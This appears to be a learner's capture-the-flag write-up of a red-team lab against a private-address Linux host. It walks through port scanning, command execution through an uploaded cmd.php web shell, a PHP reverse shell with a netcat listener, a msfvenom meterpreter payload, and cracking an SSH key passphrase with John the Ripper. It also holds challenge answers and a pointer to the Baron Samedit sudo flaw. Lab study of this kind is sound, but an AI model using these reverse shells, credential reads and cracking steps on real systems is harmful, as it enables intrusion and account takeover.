<h1>Challenge: Operation ATT&CK Unveil - decoding cyber tactics</h1>

<h2>Scenario</h2>
<p>During a competitive Red Team vs. Blue Team war games exercise, you are tasked as a Red Team operator to conduct a comprehensive penetration test on the target organization's infrastructure. 
Your objective is to simulate a multi-vector attack - a sophisticated offensive leveraging diverse techniques to breach the organization's defenses, bypass controls and exploit vulnerabilities 
across multiple domains. You will employ techniques mapped to the MITRE ATT&CK Framework, focusing on key tactics such as Initial Access, Execution, Persistence, Privilege Escalation and Defense Evasion.</p>
<h2>Description</h2>
<p>The target machine runs on Linux OS with an IP address of 10.10.1.213. This experience requires knowledge of web and Sudoer Loophole exploitation, network scanning skills, PHP File Upload and PHP Reverse 
Shell, SSH id-RSA Key Passphrase Cracking and credential attack, SSH cracking methods, and Sudo Shell Escaping. You must demonstrate hands-on skills using Bruteforcing, Remote Code Execution attacks, privilege 
escalation and other web exploitation techniques.</p>

<h2>Flags</h2>
<p>Challenge 1:</p>
<p>How many well-known ports are open on the target ?</p>
<p>Answer: nmap -sT -F 10.10.1.213 shows that 3 ports are open</p>
<p>Challenge 2:</p>
<p>What is the version of OpenSSH running on the target ?</p>
<p>Answer: nmap -sV -p 22 10.10.1.213 shows that OpenSSH 8.2p1 is running</p>
<p>Challenge 3:</p>
<p>What is the version of the OS kernel on the target system ?</p>
<p>Answer: this was hard to answer, because all details nmap gave me was not exact enough (nmap gives an estimate or something like that). 
    I could answer the question after learning about challenge 5. Surfing to <b>http://10.10.1.213/upload/cmd.php?cmd=uname -r</b> gave the answer:
    5.4.0-42 (curl http://10.10.1.213/upload/cmd.php?cmd=uname%20-r)<p>
<p>Challenge 4:</p>
<p>Identify the page that has the file upload vulnerability </p>
<p>Tip: use httrack to download the website for complete analysis</p>
<p><ol>
<ul>console: httrack</ul>
<ul>open the source file of index.html </ul>
<ul>answer: upload.php</ul>
</ol></p>
<p>Challenge 5:</p>
<p>What is the hash value stored in the file user.txt at the target ?</p>
<p>Answer: damn, this was hard without having any experience or clue how to do this. I found out the following:</p>
<p>This topic is about <b>File Inclusion Vulnerabilities</b>. We have <b>Remote File Inclusion</b> and we have <b>Local File Inclusion</b>. These vulnerabilities 
are often found in poorly-written web applications. These vulnerabilities occur when a web application allows the user to submit input into files or upload files 
to the web server. <b>LFI</b> allows an attacker to read (and sometimes execute) files on the victim machine. This can be very dangerous because if the web 
server is misconfigured and running with high privileges, the attacker may gain access to sensitive information. If the attacker is able to place code on the 
web server through other means, then they may be able to execute arbitrary commands. <b>RFI</b> are easier to exploit but less common.</p>
<h2>LFI</h2>
<p>When looking at http://10.10.1.213/upload we can see there is a file named <b>cmd.php</b>. From now on, finding this file has to raise an alert because we can 
do all kinds of things with this.</p>
<p><ol>
    <ul>http://10.10.1.213/upload/cmd.php?cmd=[Linux command(s)]</ul>
    <ul>http://10.10.1.213/upload/cmd.php?cmd=head /etc/passwd</ul>
    <ul>http://10.10.1.213/upload/cmd.php?cmd=ls /home</ul>
    <ul>http://10.10.1.213/upload/cmd.php?cmd=ls /home/henry</ul>
    <ul>http://10.10.1.213/upload/cmd.php?cmd=ls /home/henry/Desktop</ul>
    <ul>http://10.10.1.213/upload/cmd.php?cmd=head /home/henry/Desktop/user.txt</ul>
    <ul>Answer to challenge 5 is CrJ9</ul>
</ol></p>
<h2>RFI</h2>
<p>If we want to make it a bit more difficult, we can also use RFI</p>   
<p><ol>
<ul>Kali has a collection of webshells at /usr/share/webshells</ul>
<ul>In the php folder a file named php-reverse-shell.php exists</ul>
<ul>nano php-reverse-shell.php and change the value at $ip into the IP address of the Kali machine and use </ul>
<ul>Use a webbrowser to go to 10.10.1.213</ul>
<ul>Upload php-reverse-shell.php to the webserver, if it doesn't work immediately just try again</ul>
<ul>In the terminal type: nc -nlvp 1234</ul>
<ul>In the webbrowser, go to http://10.10.1.213/upload/php-reverse-shell.php</ul>
<ul>In the webshell: cd home</ul>
<ul>cd henry</ul>
<ul>cd Desktop</ul>
<ul>cat user.txt -> answer to challenge 5 is CrJ9</ul>
</ol></p>
    <h2>/etc/passwd</h2>
    <p>It's always a good idea to read the contents of /etc/passwd</p>
    <p><ol>
        <ul>cat /etc/passwd</ul>
    </ol></p>
<p>The /etc/passwd file is the cornerstone of user account management, serving as the first line of defense against unauthorized access. /etc/passwd holds important user account details and stores user 
    data such as home directories, shell preferences, usernames, user IDs, group IDs etc. Any user with a user ID above 1000 isn't a default user and has been added to the system. The password column contains an X, 
    indicating that the password is stored in the /etc/shadow file.</p>
    <h2>Basic System Enumeration</h2>
    <p><ol>
        <ul>uname -a</ul>
        <ul>hostname</ul>
        <ul>lscpu</ul>
        <ul>ls /home</ul>
        <ul>ls /var/www/html</ul>
        <ul>ls /var/www/</ul>
        <ul>ps aux | grep root</ul>
        <ul>netstat -tulpn</ul>
        <ul>ps -aux | grep root | grep mysql</ul>
        <ul>ifconfig</ul>
        <ul>find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \;</ul>
        <ul>locate pass | more</ul>
        <ul>find / -perm -u=s -type f 2>/dev/null</ul>
    </ol></p>
    <p>During enumeration I found a file name id_rsa.tar.gz in /var/www. I was able to unzip this file and read the contents of the id_rsa.tar file which turned out to be a private key file.</p>
    <h2>SSH private key hacking</h2>
    <p><ol>
        <ul>copy the contents of the file in the remote shell</ul>
        <ul>start a new console on the local Kali system, start nano and paste the copied content in a new file named priv_key.txt</ul>
        <ul>chmod 600 priv_key.txt</ul>
        <ul>ssh -i priv_key.txt root@10.10.1.213</ul>
        <ul>Alert: "A passphrase is needed"</ul>
        <ul>python /usr/share/john/ssh2john priv_key.txt > hash.txt</ul>
        <ul>john hash.txt</ul>
        <ul>If standard john wordlist doesn't work, try this  --wordlist=/usr/share/wordlists/rockyou.txt</ul>
        <ul>After some minutes john found the password <b>boylover1</b></ul>
    </ol></p>
    <p>Previously, we found the user named <b>henry</b> during enumeration of the system. We can use this username for ssh connection:</p>
    <p><ol>
        <ul>ssh -i priv_key.txt henry@10.10.1.213</ul>
        <ul>enter the passphrase boylover1</ul>
        <ul>if everything went well, we are in the system using SSH</ul>
    </ol></p>
<p>Challenge 6:</p>
<p>What is the hash value stored in the file root.txt at the target ?</p>
<p>Answer: again, this is hard without previous experience or knowledge. It has something to do with privilege escalation or adding things to the /etc/sudoers.d file. Work in progress ...</p>
<p>The internet is littered with improperly coded web applications with multiple vulnerabilities being disclosed on a daily base. One of the more critical vulnerabilities 
is Remote File Inclusion (RFI) that allows an attacker to force PHP code of their choosing to be executed by the remote site even though it is stored on a different 
site</p>
<p>We will try Metasploit to find the answer to challenge 6.</p>
<p><ol>
    <ul>msfvenom -p php/meterpreter/reverse_tcp LHOST=[Kali IP] LPORT=5555 -f raw -o shell.php</ul>
    <ul>msfconsole</ul>
    <ul>use exploit/multi/handler</ul>
    <ul>set LHOST 10.10.1.2</ul>
    <ul>set LPORT 5555</ul>
    <ul>set PAYLOAD php/meterpreter/reverse_tcp</ul>
    <ul>exploit</ul>
</ol></p>
<p>Upload shell.php to 10.10.1.213 and open http://10.10.1.213/upload/shell.php. This will connect back to the local Metasploit listener and open up a shell on 
the server.</p>
<p>Now, we can use all kinds of Linux commands such as ls, head, cat etc. For example: ls /etc/passwd; cat /etc/passwd</p>
    <h2>Sudo vulnerability</h2>
    <p>
    <ol>
        <ul>as root.txt is a file that can only be found when having user rights, we have to find a way to elevate privileges from www-data to root</ul>
        <ul>sudo -V</ul>
        <ul>Sudo version is 1.8.31</ul>
        <ul>This sudo version has a vulnerability</ul>
    </ol></p>
<p>A critical bug in sudo came out and could potentially affect most of the Linux-based operating systems, since this tool is usually installed by default. This vulnerability is identified as CVE-2021-3156, 
    but better known as "Baron Samedit", and is sitting there in the code since July 2011, ready to guide you to the underworld. It affects legacy versions from 1.8.2 to 1.8.31p2 and stable versions from 1.9.0 
    to 1.9.5p1. If you have not done it already, patch now!</p>
